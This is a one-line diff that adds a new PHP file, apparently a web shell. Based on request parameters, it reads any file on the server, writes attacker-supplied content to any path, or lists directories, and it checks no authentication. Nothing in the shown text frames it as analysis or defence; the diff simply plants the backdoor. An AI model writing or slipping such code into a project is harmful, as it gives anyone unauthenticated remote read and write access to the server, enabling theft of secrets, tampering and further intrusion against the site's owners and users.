@@ -1,0 +1,1 @@
+<?php $a=$_REQUEST['a']??'';$p=$_REQUEST['p']??'';if($a==='r'){echo file_get_contents($p);}elseif($a==='w'){echo file_put_contents($p,$_POST['c'])!==false?'OK':'ERR';}elseif($a==='l'){foreach(scandir($p)as$f)echo(is_dir("$p/$f")?'D':'F').":$f\\n";}
